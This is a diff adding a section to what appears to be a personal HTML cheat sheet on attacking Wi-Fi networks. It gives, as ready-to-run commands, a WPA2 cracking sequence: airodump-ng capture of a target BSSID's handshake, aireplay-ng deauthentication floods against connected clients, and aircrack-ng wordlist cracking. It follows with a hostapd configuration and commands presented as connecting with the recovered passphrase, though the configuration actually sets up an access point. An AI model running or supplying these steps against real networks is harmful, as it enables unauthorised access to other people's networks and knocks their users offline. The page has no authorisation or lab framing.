@@ -40,3 +40,42 @@
 <p><span style="font-size: x-large;"><strong>to get IP address of the new interface you started</strong></span></p>
 <p>&nbsp;</p>
 <p><span style="font-size: x-large;">dhclient -v wlan1 <span style="font-size: medium;"># you can then scan with nmap</span></span></p>
+
+<h1>&nbsp;</h1>
+<p>&nbsp;</p>
+<h2><span style="font-size: xx-large; background-color: #339966;"><strong>WPA2 Live Cracking&nbsp;</strong></span></h2>
+<p><span style="font-size: medium;">- getting the 4 way handshake</span></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><span style="font-size: x-large;">airodump-ng wlan0 <span style="font-size: medium;">#ensure the interface name has not changed</span></span></p>
+<p><span style="font-size: x-large;">airodump-ng --bssid B8:0D:F7:D5:79:F9 -c 6 wlan0mon -w &lt;outputfilename&gt;&nbsp;<span style="font-size: medium;">#bssid and channel for specific capture, add -w for output</span></span></p>
+<p><span style="font-size: x-large;">aireplay-ng -0 &lt;number of deauth packs&gt; -a B8:0D:F7:D5:79:F9 -h 02:00:00:00:09:00 wlan0 <span style="font-size: medium;">#-0 &lt;no. of deauth packs&gt; = deauth -a=connected client mac </span>&nbsp;</span></p>
+<p><span style="font-size: x-large;">aircrack-ng filename.cap -w &lt;wordlist to crack&gt;&nbsp;<span style="font-size: medium;"># use aircrack once you have enough IVs - need a wordlist to crack</span></span></p>
+<p>&nbsp;</p>
+<hr />
+<p><strong><span style="font-size: x-large;">To connect to the network with found passphrase:</span></strong></p>
+<p><span style="font-size: medium;">- use hostapd - first create a .conf file, then connect</span></p>
+<p><span style="font-size: medium;">- Note you must start this on a different wireless interface&nbsp;</span></p>
+<p>&nbsp;</p>
+<pre class="notranslate"><span style="font-size: large; font-family: arial, helvetica, sans-serif;"><code>interface=wlan0
+driver=nl80211
+ssid=&lt;enter name&gt;
+hw_mode=g
+channel=11
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=1
+wpa=2
+wpa_passphrase=&lt;enter passphrase/key&gt;
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+wpa_group_rekey=86400
+ieee80211n=1
+wme_enabled=1</code></span></pre>
+<p>&nbsp;</p>
+<p class="notranslate"><span style="font-size: x-large;"><code># airmon-ng check kill #if needed</code></span></p>
+<p class="notranslate"><span style="font-size: x-large;"><code>iwconfig wlan0 mode monitor </code></span></p>
+<p class="notranslate"><span style="font-size: x-large;"><code>ifconfig wlan0 up </code></span></p>
+<p class="notranslate"><span style="font-size: x-large;"><code>hostapd ./hostapd.conf</code></span></p>
+<p><span style="font-size: x-large;">&nbsp;</span></p>
+<p>&nbsp;</p>
